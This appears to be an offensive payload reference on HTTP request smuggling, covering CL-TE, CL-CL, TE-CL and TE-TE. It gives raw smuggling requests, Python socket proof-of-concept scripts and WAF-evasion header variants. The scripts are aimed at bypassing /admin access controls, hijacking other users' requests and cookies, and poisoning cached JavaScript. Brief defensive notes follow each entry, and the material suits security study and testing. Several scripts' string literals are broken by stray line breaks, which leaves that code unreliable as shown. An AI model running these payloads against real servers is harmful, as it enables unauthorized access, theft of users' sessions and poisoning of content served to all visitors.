# Request Smuggling

_4 web payloads_

### CL-TE Request Smuggling  `smuggling-cl-te`
_Content-Length and Transfer-Encoding smuggling_
Subcategory: **CL-TE** · tags: `smuggling` `request` `http`

**Prerequisites:**
- Target uses multi-layer proxies
- Frontend/backend processing differences

**Attack Chain:**

**CL-TE basics**
> CL-TE smuggling
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
**Syntax breakdown:**
- `Content-Length` — the frontend proxy uses CL _header_
- `Transfer-Encoding` — the backend server uses TE _header_

**TE-CL basics**
> TE-CL smuggling
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```
**Syntax breakdown:**
- `Transfer-Encoding` — the frontend proxy uses TE _header_
- `Content-Length` — the backend server uses CL _header_

**TE-TE**
> TE-TE smuggling
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

SMUGGLED
```
**Syntax breakdown:**
- `Transfer-Encoding: x` — obfuscated TE header _header_

**WAF/EDR Bypass Variants:**

**TE header obfuscation variants**
> Trigger request smuggling by adding spaces, tabs, newlines, multiple headers, spelling variants, and so on to the Transfer-Encoding header, causing the frontend and backend proxies to parse the header differently
```
# TE header obfuscation (making the front/back end parse TE inconsistently):
Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

X: x
Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
**Syntax breakdown:**
- `# TE header obfuscation (making the front/back end parse TE inconsistently):` — primary command _command_
- `...` — 9 lines total _value_

**Chunked extension field and CL-TE combined exploitation**
> Use the extension field of HTTP Chunked encoding (content after the semicolon) to interfere with parsing, or use the CL-0 trick to make the frontend think the request has no body while the backend continues to process the smuggled second request
```
# Chunked extension field (RFC-permitted post-semicolon extension):
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0;ext="injected"

G

# CL-0 smuggling:
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /admin HTTP/1.1
Host: target.com

```
**Syntax breakdown:**
- `# Chunked extension field (RFC-permitted post-semicolon extension):` — primary command _command_
- `...` — 14 lines total _value_

**Overview:** HTTP request smuggling (CL-TE type) exploits the different priority parsing of the Content-Length and Transfer-Encoding headers between the frontend server (such as a reverse proxy) and the backend server, "smuggling" a malicious request into another normal request to achieve attack effects such as bypassing security controls, request hijacking, and cache poisoning.

**Vulnerability Principle:** The HTTP/1.1 specification stipulates that when both Content-Length and Transfer-Encoding are present, Transfer-Encoding takes priority. But different server implementations are inconsistent: the frontend may prefer Content-Length to determine the request boundary, while the backend prefers Transfer-Encoding. This parsing difference causes what the frontend considers one request to be split into two requests at the backend.

**Exploitation Method:** First use the timing technique to probe for a CL-TE smuggling vulnerability by constructing a request containing both Content-Length and Transfer-Encoding: chunked, so the frontend parses it as one complete request per CL and forwards it, while the backend parses it per TE and the remaining part becomes the prefix of the next request; then use the smuggled prefix to achieve request hijacking, bypass access control, and steal other users' request data.

**Defensive Measures:** Use the HTTP/2 protocol end-to-end between the front and back ends to avoid parsing ambiguity; configure the frontend proxy to normalize request headers and reject requests with ambiguous headers; configure the backend server to reject requests containing both Content-Length and Transfer-Encoding; deploy dedicated request smuggling detection rules; use end-to-end encryption to prevent middleware from tampering with requests.

---

### CL-CL Smuggling  `smuggling-cl-cl`
_Exploit the difference in how the frontend proxy and backend server handle multiple Content-Length headers while both process the Content-Length header to achieve HTTP request smuggling_
Subcategory: **CL-CL** · tags: `smuggling` `cl-cl` `http`

**Prerequisites:**
- A frontend proxy (e.g. HAProxy/Nginx) + backend server architecture exists
- The two ends parse the Content-Length header differently
- Understanding of HTTP request smuggling principles

**Attack Chain:**

**Detect the CL-CL smuggling condition**
> Probe whether the target has the double-CL smuggling condition
_platform: linux_
```
# Detect the frontend proxy type:
curl -sI "http://target.com/" | grep -iE "server:|via:|x-forwarded"

# Send a request containing two Content-Length headers:
curl -v "http://target.com/"   -H "Content-Length: 6"   -H "Content-Length: 0"   -d "test12"

# Observe the response:
# - If it returns normally: only one CL may have been parsed
# - If 400/error: the server rejects multiple CLs (secure)
# - If partially processed: smuggling is possible
```
**Syntax breakdown:**
- `-H "Content-Length: 6"` — the first CL header, the frontend may use this one _parameter_
- `-H "Content-Length: 0"` — the second CL header, the backend may use this one _parameter_

**CL-CL request smuggling POC**
> Construct a smuggling request containing two Content-Length headers, injecting a malicious request into the backend processing queue
```
# Python POC - CL-CL smuggling
import socket

def smuggle_cl_cl(host, port):
    payload = (
        "POST / HTTP/1.1
"
        f"Host: {host}
"
        "Content-Length: 44
"   # The frontend uses this CL
        "Content-Length: 0
"    # The backend uses this CL
        "
"
        "GET /admin HTTP/1.1
"  # The smuggled request
        f"Host: {host}
"
        "
"
    )
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096).decode(errors="ignore")
    print(resp)
    s.close()

smuggle_cl_cl("target.com", 80)
```
**Syntax breakdown:**
- `Content-Length: 44` — the CL value parsed by the frontend proxy, includes the length of the smuggled request _value_
- `Content-Length: 0` — the CL value parsed by the backend, considers the body empty _value_
- `GET /admin` — the second smuggled/injected request, processed by the backend as an independent request _value_

**Use CL-CL smuggling to bypass frontend access control**
> Use CL-CL smuggling to bypass the frontend proxy's ACL access restriction and access /admin
```
# Scenario: the frontend restricts /admin access, bypass via smuggling
import socket

def bypass_acl(host, port):
    # Smuggle a request to the /admin endpoint
    smuggled = (
        "GET /admin HTTP/1.1
"
        f"Host: {host}
"
        "
"
    )
    content_length_real = len(smuggled)
    
    payload = (
        "POST / HTTP/1.1
"
        f"Host: {host}
"
        f"Content-Length: {content_length_real}
"
        "Content-Length: 0
"
        "Connection: keep-alive
"
        "
"
        + smuggled
    )
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    # Receive two responses
    resp = s.recv(8192).decode(errors="ignore")
    print("[Response 1 - Normal]")
    print(resp[:500])
    resp2 = s.recv(8192).decode(errors="ignore")
    print("[Response 2 - Smuggled /admin]")
    print(resp2[:500])
    s.close()

bypass_acl("target.com", 80)
```
**Syntax breakdown:**
- `Connection: keep-alive` — keep the TCP connection reused so the smuggled request can be processed by the backend _value_
- `recv(8192)` — receive two HTTP responses, the second is the result of the smuggled request _command_

**WAF/EDR Bypass Variants:**

**HTTP/2 downgrade bypass**
> Exploit the inconsistent parsing of request boundaries between the front and back ends during an HTTP/2 to HTTP/1.1 protocol downgrade to achieve smuggling
```
# HTTP/2 -> HTTP/1.1 downgrade exploitation
# Smuggling when the frontend is H2 and the backend is H1
:method: POST
:path: /
:authority: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

# H2C upgrade smuggling
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: <base64>
Connection: Upgrade, HTTP2-Settings
```
**Syntax breakdown:**
- `# HTTP/2 -> HTTP/1.1 downgrade exploitation` — primary command _command_
- `...` — 14 lines total _value_

**Connection reuse manipulation**
> Smuggle a request in the proxy chain via the difference in double Content-Length header values and keep-alive connection reuse
```
# Double CL value difference
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Content-Length: 50

12345GPOST /admin HTTP/1.1
Host: target.com

# Exploit keep-alive connection reuse
GET / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Length: 0

GET /admin HTTP/1.1
Host: internal.target.com
```
**Syntax breakdown:**
- `# Double CL value difference` — primary command _command_
- `...` — 14 lines total _value_

**Proxy chain confusion**
> Exploit differences in how multi-layer proxies handle spaces and colons in the Content-Length header to achieve request smuggling
```
# Multi-layer proxy CL handling differences
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Content-Length : 0

GET /admin HTTP/1.1
Host: target.com
X: 1

# Space-obfuscated CL header
POST / HTTP/1.1
Host: target.com
 Content-Length: 0
Content-Length: 42

GET /internal HTTP/1.1
Host: target.com
```
**Syntax breakdown:**
- `# Multi-layer proxy CL handling differences` — primary command _command_
- `...` — 15 lines total _value_

**Overview:** CL-CL (Content-Length - Content-Length) smuggling occurs when the frontend and backend handle multiple Content-Length headers in an HTTP request inconsistently. RFC 7230 stipulates that a request containing multiple CLs should not be accepted, but some server implementations choose one of the CLs. If the frontend uses the first CL and the backend uses the second CL (or vice versa), an attacker can inject a second complete HTTP request into the body of one request.

**Vulnerability Principle:** The frontend proxy and backend server choose different CL values when receiving a request containing multiple Content-Length headers. One party uses the first CL to read the request body, the other uses the second CL, causing part of the data to be treated as the next request.

**Exploitation Method:** Exploitation flow: 1) confirm the frontend-backend architecture 2) send a double-CL request to detect the difference 3) construct a smuggling payload to inject the malicious request into the backend queue 4) use smuggling to bypass the ACL/WAF and access restricted resources 5) possibly further achieve request hijacking/cache poisoning.

**Defensive Measures:** 1) RFC compliance: reject requests containing multiple Content-Lengths (return 400) 2) unify the CL parsing logic of the frontend and backend 3) use HTTP/2 end-to-end 4) have the frontend normalize the request before forwarding 5) disable TCP reuse with Connection: keep-alive.

---

### TE-CL Smuggling  `smuggling-te-cl`
_Exploit the difference where the frontend uses Transfer-Encoding while the backend uses Content-Length to achieve HTTP request smuggling_
Subcategory: **TE-CL** · tags: `smuggling` `te-cl` `http`

**Prerequisites:**
- The frontend proxy prioritizes Transfer-Encoding
- The backend server prioritizes Content-Length
- Understanding of the chunked encoding format

**Attack Chain:**

**Detect the TE-CL difference**
> Detect the priority difference between the frontend and backend for TE vs CL
```
# Send a request containing both TE and CL:
curl -v "http://target.com/"   -H "Transfer-Encoding: chunked"   -H "Content-Length: 3"   -d "0

"

# Use timing detection:
# If the backend uses CL, it will wait for more data (timeout)
import socket, time

s = socket.socket()
s.connect(("target.com", 80))
payload = (
    "POST / HTTP/1.1
"
    "Host: target.com
"
    "Transfer-Encoding: chunked
"
    "Content-Length: 6
"
    "
"
    "0

"
)
s.send(payload.encode())
start = time.time()
resp = s.recv(4096)
elapsed = time.time() - start
print(f"Response in {elapsed:.2f}s")
# Fast response = backend uses TE, delayed response = backend uses CL
```
**Syntax breakdown:**
- `Transfer-Encoding: chunked` — chunked transfer encoding, used preferentially by the frontend _value_
- `Content-Length: 6` — the backend may use CL to determine the body length _value_
- `0

` — the terminating chunk of chunked encoding (0 length) _value_

**TE-CL smuggling POC**
> TE-CL smuggling: the frontend processes and forwards the entire body per chunked, the backend reads only part per CL, and the remainder becomes a smuggled request
```
import socket

def te_cl_smuggle(host, port):
    # Frontend (TE): reads until "0

" ends → the entire payload is one request
    # Backend (CL): reads only the bytes specified by Content-Length → the remaining bytes are a new request
    
    smuggled = "GET /admin HTTP/1.1
Host: {}

".format(host)
    
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: 4
"
        "Transfer-Encoding: chunked
"
        "
"
        "{}
"
        "{}"
        "0

"
    ).format(host, format(len(smuggled), "x"), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

te_cl_smuggle("target.com", 80)
```
**Syntax breakdown:**
- `format(len(smuggled), "x")` — convert the smuggled request length to hexadecimal (chunked format) _command_
- `Content-Length: 4` — the backend reads only 4 bytes, the remaining data becomes the next request _value_

**TE-CL smuggling to achieve request hijacking**
> Smuggle an incomplete POST request so the next user's request content (including cookies) is reflected into the search results
```
# Use smuggling to hijack the next user's request
import socket

def hijack_request(host, port):
    # Smuggle an incomplete POST request
    # The next normal user's request will be concatenated as the body of this POST
    smuggled = (
        "POST /search HTTP/1.1
"
        "Host: {}
"
        "Content-Type: application/x-www-form-urlencoded
"
        "Content-Length: 200
"  # A large CL will swallow the next request
        "
"
        "q="  # The next request's data will be treated as the search parameter
    ).format(host)
    
    chunk_size = format(len(smuggled), "x")
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: 4
"
        "Transfer-Encoding: chunked
"
        "
"
        "{}
"
        "{}"
        "0

"
    ).format(host, chunk_size, smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    print(s.recv(4096).decode(errors="ignore")[:500])
    s.close()

hijack_request("target.com", 80)
```
**Syntax breakdown:**
- `Content-Length: 200` — deliberately set a large CL to "swallow" the header of the next request _value_
- `q=` — the next user's request data is concatenated into the search parameter _value_

**WAF/EDR Bypass Variants:**

**TE header case variant bypass**
> Exploit the difference in how different proxies handle the case of the Transfer-Encoding header name and its value to bypass TE-CL smuggling detection
```
# TE header case obfuscation
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

# Transfer-Encoding variants
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
```
**Syntax breakdown:**
- `# TE header case obfuscation` — primary command _command_
- `...` — 17 lines total _value_

**Whitespace character injection**
> Inject tabs, leading spaces, and CRLF characters into the Transfer-Encoding header so that different proxies parse it differently
```
# Tab/newline injection into the TE header
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding:\tchunked

# Leading-space obfuscation
POST / HTTP/1.1
Host: target.com
Content-Length: 4
 Transfer-Encoding: chunked

# CRLF injection variant
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked\x0d\x0aX-Ignore: x
```
**Syntax breakdown:**
- `# Tab/newline injection into the TE header` — primary command _command_
- `...` — 15 lines total _value_

**chunk extension field exploitation**
> Exploit the chunk-extension field in HTTP chunked transfer and non-standard chunk size formats to cause frontend/backend parsing differences
```
# chunk extension obfuscation
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5;ext=val
hello
0

# Overly long chunk extension
5;aaaaaaa...aaaa=bbbb...bbb
hello
0

# Invalid chunk size format
 5
hello
0

# 0x prefix
0x5
hello
0
```
**Syntax breakdown:**
- `# chunk extension obfuscation` — primary command _command_
- `...` — 20 lines total _value_

**Overview:** TE-CL smuggling occurs when the frontend proxy prioritizes Transfer-Encoding (chunked) while the backend server prioritizes Content-Length. The frontend forwards the complete data to the backend per chunked encoding, but the backend reads only the number of bytes specified by CL, and the extra data is left in the TCP buffer and treated as the next independent request.

**Vulnerability Principle:** The frontend and backend handle the priority of a simultaneously present Transfer-Encoding and Content-Length inconsistently. RFC 7230 stipulates that CL should be ignored when TE is present, but some backend implementations prefer CL.

**Exploitation Method:** Exploitation flow: 1) detect the TE vs CL priority difference 2) construct a request containing both TE and CL 3) the frontend forwards the complete request per TE 4) the backend truncates per CL, and the remaining data becomes the smuggled request 5) the smuggled request bypasses the ACL/WAF or hijacks other users' requests.

**Defensive Measures:** 1) unify the TE/CL priority of the front and back ends 2) reject requests containing both TE and CL 3) use HTTP/2 4) disable the backend's TCP connection reuse 5) have the frontend normalize the request before forwarding.

---

### TE-TE Smuggling  `smuggling-te-te`
_Exploit the difference in how the frontend and backend handle various obfuscation variants of the Transfer-Encoding header to achieve request smuggling_
Subcategory: **TE-TE** · tags: `smuggling` `te-te` `http`

**Prerequisites:**
- Both the front and back ends support Transfer-Encoding
- One end can be made to ignore TE via TE header obfuscation
- Understanding of chunked encoding and HTTP smuggling principles

**Attack Chain:**

**TE obfuscation variant probing**
> Test various Transfer-Encoding obfuscation variants to find frontend/backend parsing differences
```
# Various obfuscated ways of writing Transfer-Encoding:
# Test which obfuscation makes one end ignore TE
import socket

te_variants = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",     # Space before the colon
    "Transfer-Encoding: chunked
Transfer-encoding: cow",  # Two TE headers
    "Transfer-Encoding	: chunked",    # Tab-separated
    "Transfer-Encoding: 	chunked",    # Tab prefix
    " Transfer-Encoding: chunked",     # Leading space
    "X: x
Transfer-Encoding: chunked",  # Header injection
    "Transfer-Encoding: chunked ",  # Trailing space
]

for i, te in enumerate(te_variants):
    print(f"[{i}] Testing: {te[:60]}")
    payload = (
        "POST / HTTP/1.1
"
        "Host: target.com
"
        f"{te}
"
        "Content-Length: 5
"
        "
"
        "0

"
    )
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(("target.com", 80))
        s.send(payload.encode())
        resp = s.recv(1024).decode(errors="ignore")
        status = resp.split("
")[0] if resp else "No response"
        print(f"    → {status}")
        s.close()
    except Exception as e:
        print(f"    → Error: {e}")
```
**Syntax breakdown:**
- `Transfer-Encoding: xchunked` — an invalid TE value, some servers may ignore it _value_
- `Transfer-Encoding : chunked` — a space before the colon, may cause a parsing difference _value_
- `Transfer-encoding: cow` — the second TE header overrides with an invalid value _value_

**TE-TE smuggling exploitation (frontend ignores the obfuscated TE)**
> Use TE header obfuscation to make one end process per CL and the other per TE, achieving smuggling
```
import socket

def te_te_smuggle(host, port, te_header):
    # Frontend does not recognize the obfuscated TE → uses CL
    # Backend recognizes the obfuscated TE → uses chunked
    
    smuggled = "GET /admin HTTP/1.1
Host: {}

".format(host)
    
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: {}
"
        "{}
"
        "
"
        "0
"
        "
"
        "{}"
    ).format(
        host,
        len("0

" + smuggled),
        te_header,
        smuggled
    )
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

# Use the discovered effective obfuscation variant:
te_te_smuggle("target.com", 80, "Transfer-Encoding: chunked
Transfer-encoding: cow")
```
**Syntax breakdown:**
- `Transfer-encoding: cow` — an obfuscated TE value, making one end fall back to using CL _value_

**TE-TE cache poisoning attack**
> Use TE-TE smuggling to achieve a web cache poisoning attack
```
import socket

def cache_poison_via_smuggling(host, port):
    # Achieve cache poisoning via smuggling:
    # The smuggled request points to a static resource but contains malicious response headers/content
    
    smuggled = (
        "GET /static/main.js HTTP/1.1
"
        "Host: {}
"
        "
"
    ).format(host)
    
    # Send the smuggling request first
    payload = (
        "POST / HTTP/1.1
"
        "Host: {}
"
        "Content-Length: {}
"
        "Transfer-Encoding: chunked
"
        "Transfer-encoding: x
"
        "
"
        "0
"
        "
"
        "{}"
    ).format(host, len("0

" + smuggled), smuggled)
    
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print("[*] Cache poisoned")
    print(resp.decode(errors="ignore")[:300])
    s.close()

cache_poison_via_smuggling("target.com", 80)
```
**Syntax breakdown:**
- `/static/main.js` — the target static resource URL, once poisoned it affects all visitors _value_
- `Transfer-encoding: x` — an invalid TE value obfuscation, making the frontend fall back to CL parsing _value_

**WAF/EDR Bypass Variants:**

**Multiple TE header obfuscation**
> Send multiple Transfer-Encoding headers or comma-separated multiple values, exploiting the priority difference between the front and back ends for multi-value TE headers
```
# Multiple Transfer-Encoding headers
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked

# Comma-separated multiple values
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked

# Mixed valid and invalid values
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: chunked
```
**Syntax breakdown:**
- `# Multiple Transfer-Encoding headers` — primary command _command_
- `...` — 13 lines total _value_

**Non-standard TE value obfuscation**
> Use non-standard or tampered Transfer-Encoding values to make the frontend proxy fall back to CL while the backend still parses it as chunked
```
# Junk TE value to make some proxies ignore TE
Transfer-Encoding: xchunked
Transfer-Encoding: chunked-false
Transfer-Encoding: chunk
Transfer-Encoding: CHUNKED

# Quote-wrapped
Transfer-Encoding: "chunked"

# Parameter appended
Transfer-Encoding: chunked; q=0.5
Transfer-Encoding: chunked, x

# Encoding obfuscation
Transfer-\x45ncoding: chunked
```
**Syntax breakdown:**
- `# Junk TE value to make some proxies ignore TE` — primary command _command_
- `...` — 12 lines total _value_

**Proxy-specific parsing bypass**
> Send customized smuggling payloads targeting the TE header parsing characteristics of specific proxies/servers (HAProxy/Apache/Nginx)
```
# HAProxy-specific bypass
POST / HTTP/1.1
Host: target.com
Transfer-Encoding:[\x0b]chunked

# Apache-specific bypass
POST / HTTP/1.1
Host: target.com
Transfer-Encoding:\x00chunked

# Nginx-specific bypass
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked\x20

# Generic trailing whitespace
Transfer-Encoding: chunked 
```
**Syntax breakdown:**
- `# HAProxy-specific bypass` — primary command _command_
- `...` — 14 lines total _value_

**Overview:** TE-TE smuggling occurs when both the frontend and backend support Transfer-Encoding but handle its obfuscation variants differently. By modifying the format of the TE header (mixed case, special characters, multiple TE headers, etc.), an attacker makes one end recognize TE (processing per chunked) while the other does not (falling back to CL processing), thereby producing a parsing difference to achieve smuggling.

**Vulnerability Principle:** Servers handle the non-standard format of the Transfer-Encoding header inconsistently: one party strictly matches the "chunked" keyword (not recognized after obfuscation), while the other parses loosely (still recognized after obfuscation).

**Exploitation Method:** Exploitation flow: 1) enumerate various TE obfuscation variants 2) find the variant that makes the frontend and backend parse inconsistently 3) construct a smuggling payload 4) use smuggling to bypass security controls or hijack requests/poison the cache.

**Defensive Measures:** 1) strictly normalize TE header handling 2) reject non-standard-format TE headers 3) unify the HTTP parsing logic of the front and back ends 4) use HTTP/2 to eliminate the smuggling risk 5) deploy request smuggling detection rules.

---
